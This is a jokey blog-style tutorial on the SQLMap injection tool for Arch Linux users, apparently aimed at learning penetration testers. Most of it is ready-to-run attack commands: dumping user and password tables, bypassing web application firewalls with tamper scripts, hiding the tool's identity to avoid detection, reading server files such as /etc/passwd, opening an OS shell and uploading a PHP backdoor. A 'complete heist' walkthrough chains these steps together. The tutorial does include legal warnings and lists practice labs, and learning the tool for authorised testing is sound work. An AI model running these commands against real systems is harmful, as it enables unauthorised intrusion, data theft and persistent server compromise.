SQLMap : Teaching legacy apps new ways to cry

November 1, 2025

So What the Hell Is This Thing Anyway?

SQLMap is an open-source penetration testing tool that automates SQL injection attacks. It's basically a robot that goes around knocking on database doors saying "excuse me, are you vulnerable?" and when the database says "yes," SQLMap kicks the door down and steals everything that isn't nailed down. It's what happens when someone got tired of manually typing 1' OR '1'='1 into login forms like a caveman.

Think of it as a Swiss Army knife, except instead of tools, it's full of database exploitation techniques, and instead of camping, you're using it for authorized security testing (you ARE authorized, right? RIGHT?)

Getting This Beast on Your Arch System (Because Simple Tasks Deserve Complicated Names)

The "I Actually Value My Time" Method

sudo pacman -S sqlmap

Wow. Look at that. One command. On Arch. Something that doesn't require you to manually compile from source while reading a 47-page wiki article. Mark this day in your calendar.

The "I Need Bleeding Edge Because Stable Is For Peasants" Method

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py --wizard

For those who need to live on the edge. Because nothing says "I'm a professional" like using software that might have been committed to Git 4 minutes ago by someone who was probably drunk.

Verify This Actually Installed

sqlmap --version

If this returns an error, congratulations, you've managed to break Python on a system where Python is literally required for the package manager to work. That's talent.

Your First Steps into SQL Injection (Or: "How I Learned to Stop Worrying and Love the Database")

Hold My Hand Mode

sqlmap --wizard

SQLMap will literally walk you through everything like you're a toddler learning to use a toilet. There's no shame in this. Actually, scratch that, there's a little shame. But it works, so who cares?

Testing If Something Is Even Vulnerable

sqlmap -u "http://testsite.com/page.php?id=1"

This is SQLMap's way of saying "hey website, are you injectable?" It'll poke and prod that URL parameter like a curious child with a dead bug. If the site is vulnerable, SQLMap will tell you. If it's not, SQLMap will tell you that too, along with making you feel like you wasted your time.

What All That Spew Actually Means

SQLMap vomits information at you like it's trying to impress you with how smart it is. You'll see:

  • Testing parameters (it's trying different injection points)
  • Payload attempts (the actual malicious SQL it's injecting)
  • Backend DBMS detection (is it MySQL? PostgreSQL? MS SQL? Oracle? That one weird database your uncle uses?)
  • Vulnerability confirmation (THE GOOD PART - "yes, this is exploitable")
  • About 500 lines of other crap you'll scroll past

Actually Stealing Data (The "I'm Kind of Getting This" Phase)

Show Me All the Databases

sqlmap -u "http://testsite.com/page.php?id=1" --dbs

This command lists every database on the server. It's like asking for the table of contents before you rob a library. Very polite of you.

What's Inside This Database?

sqlmap -u "http://testsite.com/page.php?id=1" -D database_name --tables

Replace 'database_name' with an actual database name unless you want SQLMap to give you an error message that makes you feel stupid. This shows all the tables, which is where the actual data lives. Look for tables named things like 'users', 'customers', 'credit_cards', or 'definitely_not_passwords'.

What Columns Are in This Table?

sqlmap -u "http://testsite.com/page.php?id=1" -D database_name -T table_name --columns

Getting warmer. Now you can see what data fields exist. This is where you find the good stuff like 'password', 'email', 'ssn', and 'mothers_maiden_name'. You know, the kind of stuff that makes identity theft possible (which you're obviously not doing because you're ethical, RIGHT?)

Give Me the Actual Data Already

sqlmap -u "http://testsite.com/page.php?id=1" -D database_name -T users -C username,password --dump

THE MOMENT YOU'VE BEEN WAITING FOR. This dumps the actual data. Usernames, passwords, everything. SQLMap will even be nice enough to crack password hashes for you automatically because why not? It's already doing all the heavy lifting.

POST Requests and Other Things That Make You Look Professional

Because Not Everything Is a GET Request (Shocking, I Know)

sqlmap -u "http://testsite.com/login.php" --data="username=admin&password=test"

POST parameters exist. Who knew? Developers who still use GET for login forms should be ashamed of themselves, but they exist, and so do POST parameters. This is how you test them.

When You Need to Actually Be Logged In

sqlmap -u "http://testsite.com/page.php?id=1" --cookie="PHPSESSID=abc123def456"

Right-click, Inspect Element, Application tab, Cookies. Copy your session cookie. Paste it here. SQLMap will now masquerade as you. Identity theft, but make it ethical.

Authentication Headers (For APIs and Other Modern Nonsense)

sqlmap -u "http://testsite.com/api/user/1" --headers="Authorization: Bearer your_token_here"

APIs think they're fancy with their Bearer tokens and OAuth. SQLMap doesn't care. Give it the token, watch it work. Simple.

The "I Actually Know What I'm Doing Now" Arsenal

Request Files (For People Who Use Burp Suite Like Adults)

sqlmap -r request.txt

Intercept a request in Burp Suite. Save it to a file. Feed it to SQLMap. This is what professionals do because manually typing out headers is for people who hate themselves.

Your request.txt should look like this:

POST /login HTTP/1.1
Host: testsite.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

username=admin&password=test

SQLMap reads this and tests EVERYTHING. Every parameter, every header, every cookie. It's thorough to the point of being annoying.

Stop Testing Everything, Just Test This One Thing

sqlmap -u "http://testsite.com/page.php?id=1&lang=en&page=home" -p id

The -p flag means "only test THIS parameter, I don't care about the others." Saves time. Makes you look like you know what you're doing. Win-win.

Turning Up the Violence (Level and Risk)

sqlmap -u "http://testsite.com/page.php?id=1" --level=5 --risk=3

Level (1-5): How many tests to run. Level 1 is "just checking." Level 5 is "leave no stone unturned, test EVERYTHING including that weird header nobody uses."

Risk (1-3): How dangerous the payloads are. Risk 3 might actually UPDATE or DELETE data. Don't use this on production unless you want to update your resume.

I Know What Database This Is, Stop Guessing

sqlmap -u "http://testsite.com/page.php?id=1" --dbms=MySQL

If you already know it's MySQL (maybe you saw it in an error message, or you're not an idiot), tell SQLMap. It'll skip the whole "is it Oracle? Is it PostgreSQL? Is it MS SQL?" dance and get straight to exploitation. Efficiency.

Bypassing WAFs (Web Application Firewalls, or "Why Can't I Have Nice Things?")

sqlmap -u "http://testsite.com/page.php?id=1" --tamper=space2comment

WAFs are those annoying security devices that block obvious attacks. Tamper scripts modify your payloads to sneak past them. It's like disguising yourself to get past a bouncer, except the bouncer is code and you're using more code.

Popular tamper scripts:

  • space2comment: Replaces spaces with SQL comments (/**/)
  • between: Uses BETWEEN instead of greater-than/less-than
  • charencode: URL encodes everything like paranoia
  • randomcase: Makes SQL keywords look drunk (sElEcT * FrOm UsErS)

Chain them together like you're building a Rube Goldberg machine:

sqlmap -u "http://testsite.com/page.php?id=1" --tamper=space2comment,between,randomcase

Pick Your Injection Technique (For Control Freaks)

sqlmap -u "http://testsite.com/page.php?id=1" --technique=BEUSTQ

SQLMap has six injection techniques. Each letter is one technique:

  • B: Boolean-based blind (true/false queries)
  • E: Error-based (make the database throw informative errors)
  • U: Union query-based (the classic)
  • S: Stacked queries (multiple queries at once)
  • T: Time-based blind (if this then wait 5 seconds)
  • Q: Inline queries (the hipster method)

Want only time-based? --technique=T. Want everything? --technique=BEUSTQ. Want to feel smart? Pick some random combination.

Full Root Access (Or: "How to Completely Own a Server in 5 Minutes")

Getting an Actual Shell on the Server

sqlmap -u "http://testsite.com/page.php?id=1" --os-shell

If the database user has FILE privileges (which they shouldn't, but developers are lazy), SQLMap will upload a web shell and give you command execution on the server. At this point you've transcended SQL injection and entered "I literally control this server" territory. Type commands, get results. It's beautiful. It's terrifying. It's probably illegal unless you have permission.

Reading Files Off the Server

sqlmap -u "http://testsite.com/page.php?id=1" --file-read="/etc/passwd"

/etc/passwd is the classic. Shows all user accounts. On Windows, try reading C:\Windows\win.ini just to prove you can. Want config files with database passwords? Try /var/www/html/config.php. The possibilities are endless and deeply concerning.

Writing Files to the Server (Because Reading Wasn't Enough)

sqlmap -u "http://testsite.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

Upload your own PHP backdoor. Now you don't even need SQLMap anymore, you have permanent access. This is the "plant a flag at the summit" moment. Obviously only do this on systems you own or have written permission to test. Prison orange is not a good look on anyone.

Running Whatever SQL You Want

sqlmap -u "http://testsite.com/page.php?id=1" --sql-query="SELECT user,password FROM mysql.user"

Direct SQL execution. Want to see all MySQL users? Done. Want to create a new admin account? Go for it. Want to DROP ALL TABLES? You monster. But yes, you could. Don't.

Checking Your Privilege (Literally)

sqlmap -u "http://testsite.com/page.php?id=1" --privileges

See what the database user can do. If you see FILE, SUPER, or DBA permissions, congratulations, you've hit the jackpot. If you see nothing interesting, well, at least you still have the data.

Reconnaissance (Know Your Enemy)

sqlmap -u "http://testsite.com/page.php?id=1" --current-user --current-db --hostname

Who am I? Where am I? What database am I in? It's like SQLMap is having an existential crisis, except the answers actually matter.

The Secret Menu (Things They Don't Tell You in Tutorials)

Stop Asking Me Questions Mode

sqlmap -u "http://testsite.com/page.php?id=1" --batch

SQLMap asks more questions than a 4-year-old. "Should I test this parameter? Should I try this technique? Do you want to save session data? Do you want fries with that?" --batch tells it to shut up and use default answers for everything. Perfect for automation or when you just can't be bothered.

Tell Me EVERYTHING (Verbose Mode)

sqlmap -u "http://testsite.com/page.php?id=1" -v 3

Verbosity levels go from 0 (silent as a mime) to 6 (never stops talking). Level 3 shows HTTP requests and responses. Level 6 shows your entire life story. Use this when you're debugging or when you want to pretend you understand what's happening.

Multithreading (Because Waiting Is for Suckers)

sqlmap -u "http://testsite.com/page.php?id=1" --threads=10

Run 10 simultaneous connections. Makes things faster. Also makes you look like you're DDoSing the target. Some WAFs will ban you. Some admins will notice. Use with caution, or don't, I'm not your mom.

Using a Proxy (For Burp Integration or Just Being Paranoid)

sqlmap -u "http://testsite.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

Route everything through Burp Suite to see what SQLMap is doing. Or route through Tor if you're being paranoid (you're not anonymous though, stop thinking you are). Or route through your corporate proxy because your company loves monitoring you.

Pretending You're Not SQLMap

sqlmap -u "http://testsite.com/page.php?id=1" --random-agent

By default, SQLMap's User-Agent header literally says "sqlmap/1.0" which is about as subtle as wearing a shirt that says "I AM HACKING YOU." This flag makes it pretend to be a normal browser. Much better for not getting caught immediately.

Being Polite (Delay Between Requests)

sqlmap -u "http://testsite.com/page.php?id=1" --delay=2

Wait 2 seconds between each request. Good for avoiding rate limits. Good for avoiding detection. Good for when you're not in a hurry and want to be nice to the server (how considerate of you).

Resuming After You Screwed Up

sqlmap -u "http://testsite.com/page.php?id=1" --resume

SQLMap crashed? Your laptop died? You accidentally closed the terminal? No problem. SQLMap saves everything in ~/.local/share/sqlmap (because Arch has to be different). Resume from where you left off like nothing happened.

Saving Output (For Your Pentest Report You'll Definitely Write)

sqlmap -u "http://testsite.com/page.php?id=1" --output-dir="/home/youruser/sqlmap-results"

Save everything to a specific folder. Professional pentesters do this so they can write reports later. You do this because you'll forget what you did in 10 minutes. Both are valid reasons.

Putting It All Together (A Complete Heist)

Here's how you actually use this tool in the real world (legally, with permission, don't email me from jail):

Step 1: Is This Thing Even Vulnerable?

sqlmap -u "http://target.com/product.php?id=5" --batch --random-agent

Basic vulnerability check. If this says "not vulnerable," you're done. Go home. If it says "vulnerable," you've got work to do.

Step 2: What Databases Exist?

sqlmap -u "http://target.com/product.php?id=5" --batch --dbs

Make a list. Look for interesting names like 'ecommerce', 'users', 'customers', or 'totally_not_credit_cards'.

Step 3: What Tables Are in the Interesting Database?

sqlmap -u "http://target.com/product.php?id=5" --batch -D ecommerce --tables

Narrowing it down. You want tables named 'users', 'admins', 'customers', 'payment_info'. Avoid tables like 'logs' or 'sessions' unless you like wasting time.

Step 4: What's In This Table?

sqlmap -u "http://target.com/product.php?id=5" --batch -D ecommerce -T users --columns

Column names tell you everything. If you see 'password', 'credit_card', 'ssn', 'secret_key', you've struck gold.

Step 5: TAKE EVERYTHING

sqlmap -u "http://target.com/product.php?id=5" --batch -D ecommerce -T users --dump

The data dump. Sit back, watch SQLMap work. It'll extract everything and even crack password hashes for you. How nice.

Step 6: Can We Go Further?

sqlmap -u "http://target.com/product.php?id=5" --batch --os-shell

The nuclear option. If this works, you've completely compromised the server. If it doesn't work, you still got the database which is pretty good. Either way, you win.

When Things Go Wrong (And They Will)

"All tested parameters do not appear to be injectable"

SQLMap's polite way of saying "I got nothing." This means either:

  • It's actually not vulnerable (possible but disappointing)
  • There's a WAF blocking you (try --tamper scripts)
  • You need to increase --level and --risk (go to 5 and 3)
  • You forgot to include cookies/headers (are you logged in?)
  • The injection point is somewhere weird (try --level=5)

Don't give up immediately. Try harder before accepting defeat.

"Connection timeout to the target URL"

The server is ignoring you. Possible reasons:

  • You've been IP banned (congrats, you were too obvious)
  • Rate limiting kicked in (add --delay=2 or more)
  • Too many threads (reduce to --threads=1)
  • The server is actually down (not your fault for once)
  • Your internet sucks (probably this)

"I Somehow Broke Python"

On Arch, this shouldn't be possible because Arch NEEDS Python to function. But if you managed it: 

sudo pacman -S python python-pip --overwrite '*'

If that doesn't work, you've entered the danger zone. Check the Arch forums. Prepare for condescending responses. Good luck, brave soldier.

"WAF Detected"

SQLMap found a Web Application Firewall. Your options:

sqlmap -u "URL" --tamper=space2comment,between --random-agent --delay=2

If that doesn't work, try different tamper scripts. If THAT doesn't work, maybe it's time to try manual injection. Or give up. Both are valid strategies.

The Legal Stuff (Read This or Talk to a Lawyer Later)

YOU MAY ONLY USE SQLMAP ON:

  • Systems you own
  • Systems where you have WRITTEN permission to test
  • Legal practice environments (HackTheBox, TryHackMe, DVWA, etc.)

DO NOT USE SQLMAP ON:

  • Your school network (expulsion is not a fun experience)
  • Your work network without explicit authorization (unemployment is also not fun)
  • Random websites (prison is definitely not fun)
  • Your ex's website (prison + civil lawsuit = really not fun)
  • Anything where you don't have permission (sensing a pattern?)

"I was just testing the security" is not a legal defense. Neither is "I didn't think I'd actually get in." Neither is "I was going to tell them after." Get permission FIRST, in WRITING, or stick to legal labs.

The Computer Fraud and Abuse Act doesn't care about your intentions. The law doesn't care that you're a curious hobbyist. Judges don't care that you use Arch btw. Don't be stupid.

Where to Practice Without Becoming a Felon

  • DVWA (Damn Vulnerable Web App): Install it locally, break it, reinstall it, break it again. It's therapeutic.
  • SQLi Labs: 75 lessons specifically about SQL injection. Perfect for learning every technique.
  • HackTheBox: Legal hacking playground. Costs money but worth it. You can break stuff guilt-free.
  • TryHackMe: Like HackTheBox but more beginner-friendly and less elitist.
  • PortSwigger Web Security Academy: Free, excellent, comprehensive. No excuses not to use this.
  • PentesterLab: Focused exercises. Gets progressively harder. Also free tier available.

sqlmap -u "URL" -p parameter_name

Parting Wisdom (TL;DR)

SQLMap turns SQL injection from a tedious manual process into a "press button, receive database" experience. It's stupidly powerful. It automates attacks that would take hours into minutes. It's the difference between learning to pick locks and just using a battering ram.

Learn this tool well and you'll understand SQL injection better than most developers who write the vulnerable code in the first place. You'll find vulnerabilities in minutes that would take others hours. You'll look like a wizard to people who don't know what they're doing.

But remember: this tool is a weapon. A very effective weapon. Use it responsibly, ethically, and legally. Get permission before testing anything. Document everything. Write reports. Be professional.

Or don't, and learn about the criminal justice system firsthand. Your choice.
